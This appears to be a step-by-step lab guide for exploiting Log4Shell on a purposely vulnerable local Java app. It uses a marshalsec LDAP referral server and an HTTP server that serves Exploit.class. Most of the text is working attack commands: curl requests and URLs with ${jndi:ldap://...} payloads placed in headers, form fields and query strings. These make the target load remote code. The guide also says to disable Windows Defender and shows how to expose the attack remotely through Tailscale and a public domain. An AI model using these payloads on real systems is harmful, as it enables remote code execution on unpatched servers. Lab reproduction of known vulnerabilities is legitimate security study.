# Log4Shell Lab Startup Guide

## Prerequisites
1. Install Java 8: `C:\Log4Shell-Lab\tools\zulu8.30.0.1-jdk8.0.172-win_x64.msi`
2. Disable Windows Defender (or add exclusion for lab folder)

## Quick Start - 3 Terminals

### Terminal 1 - Vulnerable Application
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log
```

### Terminal 2 - LDAP Server (marshalsec)
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit" 1389 0.0.0.0
```

### Terminal 3 - HTTP Server
```powershell
cd C:\Log4Shell-Lab\ldap-server\

python -m http.server 8888 --bind 0.0.0.0
```

## Local Exploitation

### Test JNDI Expansion
```powershell
curl -H "User-Agent: `${java:version}" http://localhost:8080
```

### Launch Exploit
```powershell
curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
```

### Alternative Attack Vectors
```powershell
curl -H "X-Forwarded-For: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl -X POST -d "username=`${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl "http://localhost:8080/?search=`${jndi:ldap://127.0.0.1:1389/Exploit}"
```

### Browser Attack
```
http://localhost:8080/?q=${jndi:ldap://127.0.0.1:1389/Exploit}
```

## Remote Exploitation

### Option 1: Tailscale Funnel (NAT/Office)
```powershell
# Terminal 4
tailscale funnel 8080
```

Add to hosts file: `127.0.0.1 attacker.local`

Attack URL:
```
https://win11.tailc1d7d3.ts.net/?q=${jndi:ldap://attacker.local:1389/Exploit}
```

### Option 2: Public Domain
```
http://logwebapp.mooo.com:9080/?search=${jndi:ldap://logwebapp.mooo.com:1389/Exploit}
```

### Option 3: Direct IP (replace YOUR_VM_IP)
```powershell
curl -H "User-Agent: `${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl "http://YOUR_VM_IP:8080/?user=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}"
curl -X POST -d "login=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl -H "X-Forwarded-For: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl -H "X-Real-IP: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl -H "Referer: \${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
```

Browser:
```
http://YOUR_VM_IP:8080/?q=${jndi:ldap://YOUR_VM_IP:1389/Exploit}
```

## Hosts File Entry
Add this line to `C:\Windows\System32\drivers\etc\hosts`:
```
127.0.0.1 attacker.local
```

## Ports Reference
| Port | Service |
|------|---------|
| 8080 | Vulnerable Application |
| 1389 | LDAP Server (marshalsec) |
| 8888 | HTTP Server (Exploit.class) |
